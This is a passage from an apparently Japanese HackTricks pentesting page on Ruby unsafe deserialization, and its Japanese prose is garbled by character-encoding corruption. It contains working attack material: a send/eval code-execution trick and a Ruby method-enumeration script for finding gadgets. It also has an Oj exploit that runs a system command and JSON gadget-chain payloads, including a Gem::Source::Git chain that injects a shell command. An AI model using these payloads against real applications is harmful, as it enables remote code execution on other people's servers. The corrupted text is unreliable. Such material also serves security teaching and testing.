ä¾‹ãˆã°ã€evalã‚’å‘¼ã³å‡ºã—ã€æ¬¡ã«rubyã‚³ãƒ¼ãƒ‰ã‚’ç¬¬äºŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦æ¸¡ã™ã“ã¨ã§ã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

ã•ã‚‰ã«ã€**`.send()`** ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ã†ã¡ã€æ”»æ’ƒè€…ã«ã‚ˆã£ã¦åˆ¶å¾¡ã•ã‚Œã‚‹ã®ãŒ1ã¤ã ã‘ã®å ´åˆã€å‰å›ã®è¨˜è¿°ã§è¿°ã¹ãŸã‚ˆã†ã«ã€**å¼•æ•°ã‚’å¿…è¦ã¨ã—ãªã„**ã‹ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤ã‚’æŒã¤å¼•æ•°**ã‚’æŒã¤ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä»»æ„ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚\
ã“ã‚Œã«ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã™ã¹ã¦ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’åˆ—æŒ™ã—ã¦ã€**ãã®è¦ä»¶ã‚’æº€ãŸã™èˆˆå‘³æ·±ã„ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### ãã®ä»–ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒª

ã“ã®æŠ€è¡“ã¯[ **ã“ã®ãƒ–ãƒ­ã‚°è¨˜äº‹**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared)ã‹ã‚‰å–ã‚‰ã‚Œã¾ã—ãŸã€‚

ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ä»–ã®Rubyãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã‚ã‚Šã€ã—ãŸãŒã£ã¦ä¸å®‰å…¨ãªãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«RCEã‚’å¾—ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®è¡¨ã¯ã€ã“ã‚Œã‚‰ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ã„ãã¤ã‹ã¨ã€ãã‚ŒãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼ˆåŸºæœ¬çš„ã«RCEã‚’å¾—ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹é–¢æ•°ï¼‰ï¼š

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>ãƒ©ã‚¤ãƒ–ãƒ©ãƒª</strong></td><td><strong>å…¥åŠ›ãƒ‡ãƒ¼ã‚¿</strong></td><td><strong>ã‚¯ãƒ©ã‚¹å†…ã®ã‚­ãƒƒã‚¯ã‚ªãƒ•ãƒ¡ã‚½ãƒƒãƒ‰</strong></td></tr><tr><td>Marshal (Ruby)</td><td>ãƒã‚¤ãƒŠãƒª</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (ã‚¯ãƒ©ã‚¹ã¯ãƒãƒƒã‚·ãƒ¥ï¼ˆãƒãƒƒãƒ—ï¼‰ã«ã‚­ãƒ¼ã¨ã—ã¦å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (ã‚¯ãƒ©ã‚¹ã¯ãƒãƒƒã‚·ãƒ¥ï¼ˆãƒãƒƒãƒ—ï¼‰ã«ã‚­ãƒ¼ã¨ã—ã¦å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (ã‚¯ãƒ©ã‚¹ã¯ãƒãƒƒã‚·ãƒ¥ï¼ˆãƒãƒƒãƒ—ï¼‰ã«ã‚­ãƒ¼ã¨ã—ã¦å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([json_createã«é–¢ã™ã‚‹ãƒãƒ¼ãƒˆã‚’å‚ç…§](#table-vulnerable-sinks)ã®æœ€å¾Œ)</td></tr></tbody></table>

åŸºæœ¬çš„ãªä¾‹:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Ojã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã—ãŸå ´åˆã€`hash`é–¢æ•°å†…ã§`to_s`ã‚’å‘¼ã³å‡ºã—ã€specã‚’å‘¼ã³å‡ºã—ã€fetch\_pathã‚’å‘¼ã³å‡ºã™ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚¯ãƒ©ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ©ãƒ³ãƒ€ãƒ ãªURLã‚’å–å¾—ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã€ã“ã®ç¨®ã®æœªã‚µãƒ‹ã‚¿ã‚¤ã‚ºã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã®å„ªã‚ŒãŸæ¤œå‡ºå™¨ã‚’æä¾›ã—ã¾ã—ãŸã€‚
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
ã•ã‚‰ã«ã€å‰è¿°ã®æŠ€è¡“ã«ã‚ˆã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ã«ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ãŒä½œæˆã•ã‚Œã‚‹ã“ã¨ãŒåˆ¤æ˜ã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€ã“ã‚Œã‚’å®Œå…¨ãªRCEã«å¤‰æ›ã™ã‚‹ãŸã‚ã«åˆ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®è¦ä»¶ã§ã™ã€‚
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**å…ƒã®æŠ•ç¨¿**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
